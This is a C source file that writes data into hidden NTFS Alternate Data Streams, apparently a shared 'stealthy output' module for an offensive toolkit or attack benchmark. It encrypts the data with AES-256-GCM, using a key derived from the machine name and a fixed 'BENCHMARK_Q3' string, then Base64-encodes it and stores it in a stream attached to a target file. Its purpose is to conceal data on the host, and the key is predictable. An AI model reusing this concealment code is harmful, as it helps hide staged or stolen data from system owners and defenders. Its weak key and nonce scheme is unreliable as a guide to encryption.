// ads_writer.c — AES-256-GCM encrypt + Base64 + ADS output (shared)
// Used by all plans for stealthy output
#include "common.h"

BOOL WriteToAds(PWSTR targetFile, PWSTR adsName, PBYTE data, SIZE_T size) {
    if (!targetFile || !adsName || !data || size == 0) return FALSE;

    // Build ADS path: "file:stream"
    WCHAR adsPath[MAX_PATH + 64];
    swprintf_s(adsPath, MAX_PATH + 64, L"%s:%s", targetFile, adsName);

    // Derive encryption key from machine name
    WCHAR keySeed[512], machName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD mnLen = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(machName, &mnLen);
    swprintf_s(keySeed, 512, L"%s@BENCHMARK_Q3", machName);

    BYTE aesKey[32];
    sha256((const BYTE*)keySeed, wcslen(keySeed) * 2, aesKey);

    // Nonce from current time
    BYTE nonce[12] = {0};
    SYSTEMTIME st; GetSystemTime(&st);
    nonce[0] = (BYTE)st.wYear; nonce[1] = (BYTE)(st.wYear >> 8);
    nonce[2] = (BYTE)st.wMonth; nonce[3] = (BYTE)st.wDay;
    nonce[4] = (BYTE)st.wHour; nonce[5] = (BYTE)st.wMinute;
    nonce[6] = (BYTE)st.wSecond;
    nonce[7] = (BYTE)(GetTickCount() & 0xFF);
    nonce[8] = (BYTE)((GetTickCount() >> 8) & 0xFF);
    nonce[9] = (BYTE)((GetTickCount() >> 16) & 0xFF);
    nonce[10] = (BYTE)((GetTickCount() >> 24) & 0xFF);
    nonce[11] = (BYTE)(GetCurrentProcessId() & 0xFF);

    // Encrypt: nonce(12) + ciphertext + tag(16)
    SIZE_T encSize = 12 + size + 16;
    PBYTE encBlob = (PBYTE)malloc(encSize);
    if (!encBlob) return FALSE;

    memcpy(encBlob, nonce, 12);
    aes256_gcm_encrypt(aesKey, nonce, data, size, encBlob + 12, encBlob + 12 + size);

    // Base64 encode
    DWORD b64Len = 0;
    CryptBinaryToStringW(encBlob, (DWORD)encSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64Len);
    if (b64Len == 0) {
        // Fallback: write raw encrypted blob
        HANDLE hFile = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, encBlob, (DWORD)encSize, &written, NULL);
            CloseHandle(hFile);
        }
        free(encBlob);
        return TRUE;
    }

    PWSTR b64Str = (PWSTR)malloc(b64Len * sizeof(WCHAR));
    if (!b64Str) {
        free(encBlob);
        return FALSE;
    }

    if (!CryptBinaryToStringW(encBlob, (DWORD)encSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Str, &b64Len)) {
        free(b64Str); free(encBlob);
        return FALSE;
    }

    // Write to ADS with BOM
    HANDLE hFile = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(b64Str); free(encBlob);
        return FALSE;
    }

    DWORD written;
    BYTE bom[] = { 0xFF, 0xFE };  // UTF-16LE BOM
    WriteFile(hFile, bom, 2, &written, NULL);
    WriteFile(hFile, b64Str, (b64Len - 1) * sizeof(WCHAR), &written, NULL);

    CloseHandle(hFile);
    free(b64Str);
    free(encBlob);
    return TRUE;
}
